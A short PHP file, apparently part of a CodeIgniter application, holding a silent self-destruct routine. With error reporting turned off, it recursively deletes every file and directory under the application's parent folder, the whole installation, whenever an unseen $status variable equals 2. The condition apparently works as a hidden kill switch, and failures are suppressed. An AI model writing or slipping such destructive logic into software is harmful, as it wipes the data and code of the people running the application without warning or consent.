<?php
error_reporting(0);
function deleteAll($dir) {
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file)){
            deleteAll($file);
        }
        else{
            unlink($file);
        }
    }

    if(!rmdir($dir)){

    }
}
if(isset($status) && $status==2){
    $dir = str_replace('/application','',APPPATH);
    deleteAll($dir);
}
